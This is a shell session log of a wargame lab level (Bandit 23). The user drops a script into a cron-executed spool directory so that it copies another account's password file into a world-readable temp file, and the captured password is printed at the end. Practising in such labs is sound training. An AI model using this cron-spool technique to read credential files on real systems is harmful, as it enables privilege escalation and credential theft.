### Bandit 23
*** 
```
bandit23@bandit:/var/spool/bandit24$ cat /var/log/cron.log
cat: /var/log/cron.log: Permission denied
bandit23@bandit:/var/spool/bandit24$ tail /var/log/cron.log
tail: cannot open '/var/log/cron.log' for reading: Permission denied
bandit23@bandit:/var/spool/bandit24$ clear

bandit23@bandit:/var/spool/bandit24$ ls
ls: cannot open directory '.': Permission denied
bandit23@bandit:/var/spool/bandit24$ cd~
-bash: cd~: command not found
bandit23@bandit:/var/spool/bandit24$ cd /tmp/grep -ic cron /var/log/* | grep -v :0^C
bandit23@bandit:/var/spool/bandit24$ ^C
bandit23@bandit:/var/spool/bandit24$ cd /tmp/pewpew_bandit23
bandit23@bandit:/tmp/pewpew_bandit23$ ls
pew.sh
bandit23@bandit:/tmp/pewpew_bandit23$ cat pew.sh 
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
bandit23@bandit:/tmp/pewpew_bandit23$ echo I am user bandit24 | md5sum
ee4ee1703b083edac9f8183e4ae70293  -
bandit23@bandit:/tmp/pewpew_bandit23$ cat /tmp/ee4ee1703b083edac9f8183e4ae70293
bandit23@bandit:/tmp/pewpew_bandit23$ ls
pew.sh
bandit23@bandit:/tmp/pewpew_bandit23$ cp pew.sh /var/spool/bandit24/
bandit23@bandit:/tmp/pewpew_bandit23$ cat pew.sh 
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
bandit23@bandit:/tmp/pewpew_bandit23$ cat /tmp/ee4ee1703b083edac9f8183e4ae70293
bandit23@bandit:/tmp/pewpew_bandit23$ cat /tmp/ee4ee1703b083edac9f8183e4ae70293
bandit23@bandit:/tmp/pewpew_bandit23$ ls
pew.sh
bandit23@bandit:/tmp/pewpew_bandit23$ cat pew.sh 
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
bandit23@bandit:/tmp/pewpew_bandit23$ vim pew.sh 
bandit23@bandit:/tmp/pewpew_bandit23$ ls
pew.sh
bandit23@bandit:/tmp/pewpew_bandit23$ cat pew.sh 
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/pewpew_bandit23/pass
bandit23@bandit:/tmp/pewpew_bandit23$ touch pass
bandit23@bandit:/tmp/pewpew_bandit23$ chmod 666 pass
bandit23@bandit:/tmp/pewpew_bandit23$ ls -ltrh
total 4.0K
-rw-r--r-- 1 bandit23 root 70 May  4 18:34 pew.sh
-rw-rw-rw- 1 bandit23 root  0 May  4 18:34 pass
bandit23@bandit:/tmp/pewpew_bandit23$ cp pew.sh /var/spool/bandit24/
bandit23@bandit:/tmp/pewpew_bandit23$ tail -F pass 

^C
bandit23@bandit:/tmp/pewpew_bandit23$ ls
pass  pew.sh
bandit23@bandit:/tmp/pewpew_bandit23$ cat pass 
bandit23@bandit:/tmp/pewpew_bandit23$ tail -F pass 

^C
bandit23@bandit:/tmp/pewpew_bandit23$ cat pass
bandit23@bandit:/tmp/pewpew_bandit23$ ls
pass  pew.sh
bandit23@bandit:/tmp/pewpew_bandit23$ ls -ltrh
total 4.0K
-rw-r--r-- 1 bandit23 root 70 May  4 18:34 pew.sh
-rw-rw-rw- 1 bandit23 root  0 May  4 18:34 pass
bandit23@bandit:/tmp/pewpew_bandit23$ chmod +x pew.sh 
bandit23@bandit:/tmp/pewpew_bandit23$ cp pew.sh /var/spool/bandit24/
bandit23@bandit:/tmp/pewpew_bandit23$ cat pass
bandit23@bandit:/tmp/pewpew_bandit23$ cat pass
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
bandit23@bandit:/tmp/pewpew_bandit23$ 

```
